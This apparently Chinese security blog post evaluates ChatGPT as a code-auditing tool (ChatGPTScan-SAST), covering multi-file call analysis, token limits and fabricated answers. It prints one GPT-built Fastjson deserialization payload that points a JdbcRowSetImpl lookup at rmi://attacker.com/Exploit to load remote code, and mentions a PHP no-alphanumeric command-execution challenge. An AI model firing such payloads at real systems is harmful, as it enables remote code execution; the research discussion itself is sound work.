@@ -1,0 +1,126 @@
+作者：cokeBeer@御林安全
+
+# ChatGPTScan:使用ChatGPTScan批量进行代码审计-续集
+
+## 0 简介
+
+在[ChatGPTScan:使用ChatGPTScan批量进行代码审计](https://mp.weixin.qq.com/s/QIKvRzNlAKiqh_UMOMfDdg)文章中，我们介绍了使用ChatGPT进行代码审计的命令行工具，后续的完整项目来了：<https://github.com/YulinSec/ChatGPTScan-SAST。>
+
+`ChatGPTScan-SAST`是`ChatGPTScanner`的Web版，具体使用可以查看项目的README，基本功能都已经实现。
+
+下面聊点别的。
+
+在上一篇文章中，对ChatGPT的代码审计结果作了比较简单的介绍，但略去了一部分测试结果和优缺点分析，这里补上。
+
+## 1 多文件关联能力
+
+前两天看到一篇分析ChatGPTScan的文章：<https://www.yuque.com/hackland/izmi9v/mz9p9eveyxdnhvk9>
+
+里边提到“能不能识别MVC ? ”、“是否具备多文件的代码关联能力 ? ”、“能否正确的理解调用关系 ? ”
+
+在2月16号，我们使用Spring
+Boot进行了测试，如下图，使用controller、service、serviceImpl，最终输出了我们想要的PoC、带URL的PoC。
+
+![](./img/1033577899209607548.png)
+
+![](./img/3176316053449609137.png)
+
+之前的结果图已经找不到了，所以重新测了一遍，截图：
+
+![](./img/7153756413621990303.png)
+
+GPT构造的payload：
+
+    
+    
+    POST /test/fastjson HTTP/1.1
+    Host: example.com
+    Content-Type: application/json
+    
+    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.com/Exploit","autoCommit":true}
+    
+
+2月份看到结果的时候很震惊，简单的分析也不过如此。而且有意外的收获：当时GPT给了一个不常见的poc。。。感叹于饭碗不保，还没毕业就快失业了。
+
+再来回答前面的问题：
+
+**“能不能识别MVC ? ”、“是否具备多文件的代码关联能力 ? ”、“能否正确的理解调用关系 ? ”**
+
+站在开发的角度来看代码，也许应该按照“框架-文件-数据流”来分析？
+
+从结果来看，“框架和文件”的概念被模糊掉了，它的逻辑更类似于代码审计“source-sink-dataflow”。
+
+所以，如果站在代码审计的角度，我认为这个问题的答案是肯定的，因为GPT找到了入口，也找到了service对应的实现。
+
+因为上面的例子里只有一个getUser函数，不足以支撑这个结论，所以添加了一个`WrongServiceImpl.getUser`方法进行测试：
+
+![](./img/3758573835306891160.png)
+
+可以看到，它真的懂，能够正确的理解多文件、多函数的调用关系。
+
+但，果真如此吗？
+
+## 2 多文件关联能力Minus
+
+> Minus是Plus的反义词。
+
+上面刚介绍完GPT的多文件关联能力，怎么要反补一刀？
+
+其实，虽然结果看起来很好，但存在很致命的两个问题：
+
+  1. token limit
+
+目前，OpenAI的GPT调用（无论网页还是API），对token的长度都是有限制的，这是客观瓶颈。如果单个文件在预处理后就超出了token长度限制，那也不存在什么关联能力，根本传不进去。就像这样：
+
+![](./img/8961299695724440704.png)
+
+  1. 它会瞎掰
+
+现在的模型有一些升级，但还是有可能会瞎掰，杜撰一些本不存在、不合理的东西，在代码审计场景中也一样。
+
+## 3 逻辑分析能力Minus+Plus
+
+原本打算用Minus，但今天测试的时候发现，OpenAI悄悄地对GPT模型进行了升级，会判断问题中部分主客体关联的合理性，看图：
+
+之前：
+
+![](./img/4937564231765627443.png)
+
+现在：
+
+![](./img/2579471334215915074.png)
+
+明显看出现在的推理判断逻辑较为之前更为严谨，但不超过小朋友的水平。
+
+再看一个例子，php无字母数字命令执行，3.5的结果不堪入目就不放了，看看4的回答：
+
+![](./img/509050670866839251.png)
+
+问题描述的比较清晰并且给了几个提示，但回答还是出现了`getFlag`几个字母。最后提示了十几次才得到一个正确结果。
+
+在告诉GPT`$code`不能包含字母和数字的情况下，甚至出现了url编码、八进制十六进制编码、chr函数的奇怪答案，贴两张图吧：
+
+![](./img/5097880010185754284.png)
+
+![](./img/7545832143274781246.png)
+
+## 4 总结
+
+可以看出GPT在多文件关联分析上有较强的逻辑性，加上之前API数百刀的调用量，判断一般性的分析工作可以胜任。但其对token长度的限制是目前难以绕过的瓶颈，也有人用tuning去尽可能缩短token长度，只是对于Web项目而言，还是杯水车薪。
+
+此外，在条件比较严苛的问题上的表现上还是与师傅们相差甚远，对于存在正则表达式的场景，GPT的表现相对较差，所以师傅们不必惊慌，目前的GPT在Web安全领域只能胜任助理之类的工作，完成一些小型任务，创新性和高度复杂性的任务还不能很好的完成。
+
+可以看看这篇文章：<https://mp.weixin.qq.com/s/vaf0jhuFvTReVD0nU_2kPA>
+
+现在有的一些比较好的项目：
+
+burpgpt: <https://github.com/aress31/burpgpt>
+
+Auto-GPT: <https://github.com/Significant-Gravitas/Auto-GPT>
+
+gpt4all: <https://github.com/nomic-ai/gpt4all>
+
+ChatGLM-6B: <https://github.com/THUDM/ChatGLM-6B>
+
+GPT的本质并不是纯粹的知识学习和逻辑推理，但其应用场景已经可以为个人解决很多实际问题，也期待能比肩3.5-turbo的开源模型。
+
